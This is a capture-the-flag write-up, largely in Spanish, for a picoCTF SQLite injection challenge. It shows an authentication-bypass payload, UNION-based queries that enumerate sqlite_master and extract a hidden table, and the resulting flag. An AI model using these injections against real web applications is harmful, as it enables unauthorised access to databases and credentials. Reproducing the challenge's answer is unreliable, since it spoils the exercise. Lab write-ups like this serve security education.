## Descripcion
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:59840/).

## Hints

- SQLiLite

## Solucion

En este caso, lo primero que encontramos es un panel de login, y lo primero que intento es con credenciales comunes como admin:admin123.

Hay algo curioso, ya que me regresa la estructura de la consulta sqli:
`SQL query: SELECT id FROM users WHERE password = 'admin123' AND username = 'admin'` Ya que veo como funciona esta consulta me intento loggear como admin, poniendo el campo de password como True, intento lo siguiente

`admin:' OR 1=1 /*`

Con esto me logro loggear a la pagina. 

Una vez dentro de la web, solo muestra un campo de busqueda de oficinas y muestra toda la informacion de la oficina. 

¿Que podemos hacer ahi?

Si hacemos cualquier busqueda, regresa siempre tres campos, city, address y el phone. Por lo tanto la pagina siempre va a regresar un resultado en base a esas 3 columnas. Como es sqlite, intento hacer una inyeccion para ver el contenido de todas las tablas:
`' union SELECT sql,1,2 FROM sqlite_master`

el `1,2` es para poder completar las columnas a mostrar y obtener un resultado. En este caso obtenemos este resultado:

```

|City|Address|Phone|
|---|---|---|
||1|2|
|CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)|1|2|
|CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)|1|2|
|CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)|1|2|
|CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)|1|2|
```

Aqui hay algo raro, pues la tabla more_table tiene los campos `id y flag` , por lo que deseo ver el contenido de estos campos. Entonces armo el siguiente payload:

```
'union select id,flag,1 from more_table;

```

Y obtuve el siguiente resultado: 
|City|Address|Phone|
|---|---|---|
|1|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}|1|
|2|If you are here, you must have seen it|1|


## Referencias
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

